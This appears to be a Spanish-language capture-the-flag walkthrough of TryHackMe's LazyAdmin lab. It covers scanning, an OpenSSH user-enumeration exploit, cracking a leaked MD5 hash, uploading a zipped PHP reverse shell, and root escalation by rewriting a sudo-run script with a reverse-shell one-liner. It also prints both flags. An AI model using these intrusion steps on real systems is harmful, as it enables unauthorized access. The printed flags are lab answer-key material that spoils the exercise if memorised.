**Solución CTF  -  LazyAdmin**

**CTF de Try Hack Me, paso a paso con explicación de técnicas de
enumeración, explotación y post-explotación en Linux.**

![](media_lazyadmin/media/image1.png)

**La IP objetivo será: 10.67.167.106**

![](media_lazyadmin/media/image2.png)

Se realiza la búsqueda de los primeros 1000 puertos comunes con nmap.
(nmap 10.67.167.106). Se encontró 2 puertos abiertos (SSH 22 y HTTP 80).

![](media_lazyadmin/media/image3.png)

Se realizó un escaneo con Nmap utilizando las opciones **-sV** para
identificar versiones de servicios, **-sC** para ejecutar scripts por
defecto y **-sS** (half-open scan) para un escaneo sigiloso, además de
la opción **-p** especificando los puertos. (Comando: **nmap -sV -sS -sC
-p 22,80 10.67.167.106**).

![](media_lazyadmin/media/image4.png)

Se observó con la versión de SSH que podría ser vulnerable a enumeración
de usuarios con el comando: **searchsploit OpenSSH 7.2p2**

![](media_lazyadmin/media/image5.png)

Con el comando: **searchsploit -m linux/remote/40136.py** descargas el
archivo .py

![](media_lazyadmin/media/image6.png)

Se revisó dicho archivo con palabras como "**main**" o "**argument**"
para ver la manera de como usarlo, nos da a entender que se ejecuta
directo el archivo acompañado de parámetro como una lista de usuario con
"**-U**". Comandos: **cat 40136.py \| grep \"main\"** y **cat 40136.py
\| grep \"argument\"**

![](media_lazyadmin/media/image7.png)

Se ejecutó el comando: **python3 40136.py 10.67.167.106 -U
/usr/share/seclists/Usernames/top-usernames-shortlist.txt**, sin embargo
salió error del "**time.clock()**", esto es debido a que time.clock()
fue eliminado en Python 3.8+, por lo que se reemplazó por
"**time.perf_counter()**", comando para ver el cambio en el archivo:
**cat 40136.py \| grep \"time.perf_counter\"**

![](media_lazyadmin/media/image8.png)
![](media_lazyadmin/media/image9.png)

Se volvió a ejecutar el comando: **python3 40136.py 10.67.167.106 -U
/usr/share/seclists/Usernames/top-usernames-shortlist.txt**, y nos dio 2
usuarios: **mysql** y **puppet**.

![](media_lazyadmin/media/image10.png)

Se ejecutó el mismo comando con una lista mas grande: **python3 40136.py
10.67.167.106 -U
/usr/share/metasploit-framework/data/wordlists/unix_users.txt**, y nos
dio varios nombres, aparentemente son falsos positivos.

![](media_lazyadmin/media/image11.png)
![](media_lazyadmin/media/image12.png)

Debido a esto se comenzó a revisar el puerto 80, donde carga la página
Apache por defecto.

![](media_lazyadmin/media/image13.png)

Se realizó un escaneo de directorios con el comando: **dirb
<http://10.67.167.106/>**

![](media_lazyadmin/media/image14.png)

Se encontró varios "**Directory Listing**" (contenido de
archivos/subcarpetas) y una página de Login: "**Welcome to
SweetRice!**"
![](media_lazyadmin/media/image15.png)

![](media_lazyadmin/media/image16.png)

Se estuvo revisando en todos los directorios escaneados, y en la URL:
[**http://10.67.167.106/content/inc/**](http://10.67.167.106/content/inc/),
se encontró una carpeta de nombre "**mysql_backup**"

![](media_lazyadmin/media/image17.png)

Al ingresar a dicha carpeta, se encuentra un archivo .sql, por lo que se
procedió a descargar.

![](media_lazyadmin/media/image18.png)

Se revisó dicho archivo con el comando: **cat
mysql_bakup_20191129023059-1.5.1.sql**, en una parte indica unas
credenciales: usuario: manager, password:
42f749ade7f9e195bf475f37a44cafcb

![](media_lazyadmin/media/image19.png)
![](media_lazyadmin/media/image20.png)

Se crackeo el password en la URL:
[**https://crackstation.net/**](https://crackstation.net/), dicho
password es: **Password123** de tipo **md5**.
![](media_lazyadmin/media/image21.png)

Se accedió a la pagina de Login: "**Welcome to SweetRice!**", con las
credenciales obtenidas, user: **manage**, pass:
**Password123**
![](media_lazyadmin/media/image22.png)

Una vez logeado, nos vamos al módulo "**Media
Center**".
![](media_lazyadmin/media/image23.png)
Visualizamos que podemos cargar archivos con un máximo de 2MB.

![](media_lazyadmin/media/image24.png)

Se revisa en la ruta "**/usr/share/webshells/php**" y el archivo
"**php-reverse-shell.php**" pesa 5.4KB (Comando: **ls -lh
/usr/share/webshells/php**), por lo que es copiado al directorio actual
para editarlo con el comando: **cp
/usr/share/webshells/php/php-reverse-shell.php .**

![](media_lazyadmin/media/image25.png)

Se edita el archivo con el comando: **nano** **php-reverse-shell.php**,
se cambiar la IP del Kali y el puerto al que se conectará por
reverse_shell.

![](media_lazyadmin/media/image26.png)
![](media_lazyadmin/media/image27.png)

Luego se procede con la carga del archivo "php-reverse-shell.php", click
en el boton de Browse...

![](media_lazyadmin/media/image28.png)

Se busca el archivo **.php** en el directorio actual y click en
**Open**.

![](media_lazyadmin/media/image29.png)

En Kali, se abre un puerto de escucha en el puerto 4444 usando Netcat.
Comando: **nc -lvnp
4444**
![](media_lazyadmin/media/image30.png)

Luego se hace clic en el botón "**Done**"; sin embargo, no se observa
ninguna respuesta. Probablemente la aplicación esté filtrando archivos
.php y descartando su procesamiento.

![](media_lazyadmin/media/image31.png)
![](media_lazyadmin/media/image32.png)

Debido a que en el mismo apartado hay un cuadro donde indica "Extraer
archivos ZIP", se zipea el archivo a .zip, comando: **zip
reverse-shell.zip php-reverse-shell.php**

![](media_lazyadmin/media/image33.png)
![](media_lazyadmin/media/image34.png)

Nuevamente se carga del archivo "**reverse-shell.zip**", click en el
boton de Browse... y luego **Open**.

![](media_lazyadmin/media/image28.png)
![](media_lazyadmin/media/image35.png)

Una vez cargado, se habilita el check y click en el botón "**Done**".

![](media_lazyadmin/media/image36.png)

Luego ya aparece el archivo en formato **.php**, se da click y nos
permite el acceso en el Kali con el usuario "**www-data**".

![](media_lazyadmin/media/image37.png)

Se ejecuta el comando: **python3 -c \'import pty;
pty.spawn(\"/bin/bash\")\'** para mejorar la shell y con el comando:
**find / -type f -name \"user.txt\" 2\>/dev/null** para buscar el
archivo "**user.txt**" en todo el sistema.

![](media_lazyadmin/media/image38.png)

Se visualiza el contenido del archivo y se obtiene el 1er Flag:
**THM{63e5bce9271952aad1113b6f1ac28a07}**, comando: **cat
/home/itguy/user.txt**

![](media_lazyadmin/media/image39.png)

Se visualiza 3 usuarios del sistema: root, itguy, guest con el comando:
**cat /etc/passwd \| grep \"/bin/bash\"**

![](media_lazyadmin/media/image40.png)

Nos desplazamos hacia el usuario "**itguy**" con el comando: **cd
/home/itguy** y con el comando: **ls -la** visualizamos todo su
contenido incluso el oculto, podemos ver 1 archivo **backup.pl** que
permite ejecutar y otro archivo de nombre "**mysql_login.txt**".

![](media_lazyadmin/media/image41.png)

Se visualiza en el archivo "**mysql_login.txt**" las credenciales, user:
**rice** passw: **randompass**, se guardarán por si mas adelante se
requieran.

![](media_lazyadmin/media/image42.png)

Se visualiza el contenido del archivo "**backup.pl**" y se observa que
es un script perl donde ejecuta la ruta "**/etc/copy.sh**", y este
ultimo tiene script de reverse_shell en linux. Comandos: **cat
backup.pl**, **ls -la /etc/copy.sh** y **cat /etc/copy.sh**

![](media_lazyadmin/media/image43.png)

Se válida que el usuario actual puede ejecutar la ruta "**/usr/bin/perl
/home/itguy/backup.pl**" como sudo. Comando: **sudo -l**

![](media_lazyadmin/media/image44.png)

Se reemplaza el contenido del archivo "**/etc/copy.sh**", cambiando la
**IP** del Kali y el puerto **5555**. Comando: **echo "rm /tmp/f
.............. \>/tmp/f" \> /etc/copy.sh** (no se puede escribir todo
el comando debido a que los antivirus lo detectan, sin embargo se puede
copiar y pegar por parte en el equipo objetivo).

![](media_lazyadmin/media/image45.png)

En otra terminal del Kali, se abre un puerto de escucha en el puerto
5555 usando Netcat. Comando: **nc -lvnp 5555**

![](media_lazyadmin/media/image46.png)

Se ejecuta la ruta con sudo, comando: **sudo /usr/bin/perl
/home/itguy/backup.pl**

![](media_lazyadmin/media/image47.png)

Y verificamos que se pudo acceder con el usuario **root**.
![](media_lazyadmin/media/image48.png)

Revisamos el contenido de la carpeta "**root**" con el comando: **ls
/root** y visualizamos el archivo "**root.txt**", con el comando: **cat
/root/root.txt** podemos ver la 2da Flag:
**THM{6637f41d0177b6f37cb20d775124699f}**
![](media_lazyadmin/media/image49.png)

Eso es todo xd, estaré subiendo mas soluciones de CTF en los siguientes
días, comenten si quiere que resuelva un CTF en especifico.
